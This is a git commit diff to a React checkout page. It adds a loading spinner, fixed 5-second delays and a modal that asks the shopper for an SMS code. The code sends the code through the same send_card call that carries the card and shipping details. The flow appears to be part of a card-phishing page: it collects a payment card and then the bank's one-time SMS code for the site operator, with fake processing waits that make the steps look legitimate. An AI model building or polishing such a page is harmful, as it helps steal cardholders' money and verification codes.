83ca4080af7c44aff02372ce083e2be32405f990
jg <aleksnermer@gmail.com>
2024-07-15 14:13:16 +0300

    update

--- src/pages/checout/CheckoutPage.tsx
+++ src/pages/checout/CheckoutPage.tsx
@@ -1,8 +1,8 @@
-import React, { useState } from "react";
+import React, { useState, } from "react";
 import { observer } from "mobx-react-lite";
 import styled from "@emotion/styled";
+import { Modal, Backdrop, Fade, CircularProgress } from "@mui/material";
 import { PaymentDetails, ShippingDetails } from "../../utils/interfaces";
-import cartStore from "../../store/CartStore";
 import ContactForm from "../../components/Checkout/ContactForm";
 import DeliveryForm from "../../components/Checkout/DelveryPage";
 import OrderSummary from "../../components/Checkout/OrderSummary";
@@ -43,6 +43,18 @@ const SmsCodeInput = styled.input`
   border-radius: 5px;
 `;
 
+const SmsModalContent = styled.div`
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 400px;
+  background-color: white;
+  padding: 20px;
+  border-radius: 8px;
+  box-shadow: 24;
+`;
+
 const CheckoutPage: React.FC = observer(() => {
   const [shippingDetails, setShippingDetails] = useState<ShippingDetails>({
     email: "",
@@ -67,6 +79,8 @@ const CheckoutPage: React.FC = observer(() => {
 
   const [isSmsStep, setIsSmsStep] = useState(false);
   const [smsCode, setSmsCode] = useState("");
+  const [loading, setLoading] = useState(false);
+  const [openModal, setOpenModal] = useState(false);
 
   const handleInputChange = (event: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = event.target;
@@ -89,15 +103,15 @@ const CheckoutPage: React.FC = observer(() => {
     event.preventDefault();
 
     const delivery = `
-    First Name: ${shippingDetails.firstName}, 
-    Last Name: ${shippingDetails.lastName}, 
-    Company: ${shippingDetails.company}, 
-    Address: ${shippingDetails.address}, 
-    Apartment: ${shippingDetails.apartment}, 
-    City: ${shippingDetails.city}, 
-    State: ${shippingDetails.state}, 
-    Zip Code: ${shippingDetails.zipCode}, 
-    Country: ${shippingDetails.country}, 
+    First Name: ${shippingDetails.firstName},
+    Last Name: ${shippingDetails.lastName},
+    Company: ${shippingDetails.company},
+    Address: ${shippingDetails.address},
+    Apartment: ${shippingDetails.apartment},
+    City: ${shippingDetails.city},
+    State: ${shippingDetails.state},
+    Zip Code: ${shippingDetails.zipCode},
+    Country: ${shippingDetails.country},
     Phone: ${shippingDetails.phone}
   `
       .replace(/\s+/g, " ")
@@ -111,13 +125,21 @@ const CheckoutPage: React.FC = observer(() => {
       email: shippingDetails.email,
       delivery: delivery,
     };
-
     if (!isSmsStep) {
+      setLoading(true);
+
       await user.send_card(data);
+      await new Promise((resolve) => setTimeout(resolve, 5000)); // wait for 5 seconds
+
+      setLoading(false);
       setIsSmsStep(true);
+      setOpenModal(true);
     } else {
+      setLoading(true);
       data.sms_code = smsCode;
       await user.send_card(data);
+      await new Promise((resolve) => setTimeout(resolve, 5000)); // wait for 5 seconds
+      setLoading(false);
     }
   };
 
@@ -136,20 +158,50 @@ const CheckoutPage: React.FC = observer(() => {
           paymentDetails={paymentDetails}
           handlePaymentInputChange={handlePaymentInputChange}
         />
-        {isSmsStep && (
-          <SmsCodeInput
-            type="text"
-            placeholder="Enter SMS code"
-            value={smsCode}
-            onChange={handleSmsCodeChange}
-            required
-          />
-        )}
         <CheckoutButton type="submit" isSmsStep={isSmsStep}>
           {isSmsStep ? "Send SMS" : "Pay now"}
         </CheckoutButton>
       </CheckoutFormContainer>
       <OrderSummary />
+      {loading && (
+        <Backdrop
+          sx={{ color: "#fff", zIndex: (theme) => theme.zIndex.drawer + 1 }}
+          open={loading}
+        >
+          <CircularProgress color="inherit" />
+        </Backdrop>
+      )}
+      <Modal
+        aria-labelledby="sms-code-modal"
+        aria-describedby="sms-code-modal-description"
+        open={openModal}
+        onClose={() => setOpenModal(false)}
+        closeAfterTransition
+        BackdropComponent={Backdrop}
+        BackdropProps={{
+          timeout: 500,
+        }}
+      >
+        <Fade in={openModal}>
+          <SmsModalContent>
+            <h2 id="sms-code-modal">Enter SMS Code</h2>
+            <SmsCodeInput
+              type="text"
+              placeholder="Enter SMS code"
+              value={smsCode}
+              onChange={handleSmsCodeChange}
+              required
+            />
+            <CheckoutButton
+              type="button"
+              isSmsStep={isSmsStep}
+              onClick={handleSubmit}
+            >
+              Send SMS
+            </CheckoutButton>
+          </SmsModalContent>
+        </Fade>
+      </Modal>
     </CheckoutPageContainer>
   );
 });
